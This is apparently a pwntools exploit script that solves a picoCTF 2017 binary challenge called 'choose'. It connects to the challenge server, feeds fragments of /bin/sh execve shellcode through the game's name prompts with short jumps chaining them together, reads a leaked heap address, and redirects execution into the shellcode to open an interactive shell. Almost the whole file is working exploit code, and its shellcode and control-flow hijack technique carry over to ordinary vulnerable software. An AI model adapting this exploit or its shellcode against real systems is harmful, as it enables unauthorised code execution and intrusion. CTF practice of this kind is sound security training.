from pwn import *

INPUT_STR = 0x080ed044
RUN_GAME  = 0x08049849

p = process('./choose')
p = remote('shell2017.picoctf.com',43651)

p.recvuntil("What monsters would you like to face?")

#gdb.attach(p, "b *0x08049c67\nc")


shc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
"\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80";



# 1 troll and 10 unicorns
p.sendline("t")
for i in range(10):
    p.sendline("u")

p.sendline("dummy")
#p.sendline("\x31\xc0\x50\x68\x2f\x2f\x73\x68\xeb\x0e")
p.sendline("\x31\xc0\x31\xd2\xb0\x0b\x52\xeb\x0f")

#p.sendline("\x68\x2f\x62\x69\x6e\x87\xe3\xeb\x0f")
p.sendline("\x68\x6e\x2f\x73\x68\xeb\x11")

#p.sendline("\xb0\x0b\xcd\x80")
p.sendline("\x68\x2f\x2f\x62\x69\xeb\x11")

p.sendline("\x89\xe3\x52\x53\x89\xe1\xcd\x80")

#p.sendline(shc[:8] + "\xEB\x0a")
for i in range(5):
    p.sendline("NAME%d"%i)
p.sendline("ABCDEF{}KL".format(p32(INPUT_STR + 1)))

info("Attacking Troll")
p.sendline("a") # attack troll
p.sendline("a")

print(p.readuntil("enemy at "))
troll = int(p.readn(10), 0)
info("Troll: " + hex(troll))

info("Fleeing enemies")
for i in range(10):
    p.sendline("f")
    p.readuntil(': Flee')

info("Fighting Dragon")
for i in range(5):
    p.sendline("A")

"""
0:  b8 dd cc bb aa          mov    eax,0xaabbccdd
5:  ff e0                   jmp    eax
"""

#p.sendline("A")
p.sendline("F\x68{}\xC3".format(p32(troll+10)))


p.interactive()
